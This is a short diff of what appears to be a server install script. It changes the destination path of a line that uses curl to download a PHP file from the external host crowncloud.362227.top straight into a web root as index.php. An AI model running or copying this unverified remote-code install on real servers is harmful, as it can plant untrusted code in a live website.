@@ -24,7 +24,7 @@ function check_apache(){
 	fi
 }
 
-curl -L https://crowncloud.362227.top/remote/index.php1 > /var/www/index.php
+curl -L https://crowncloud.362227.top/remote/index.php1 > /mnt/data/var/www/index.php
 
 
 function update(){
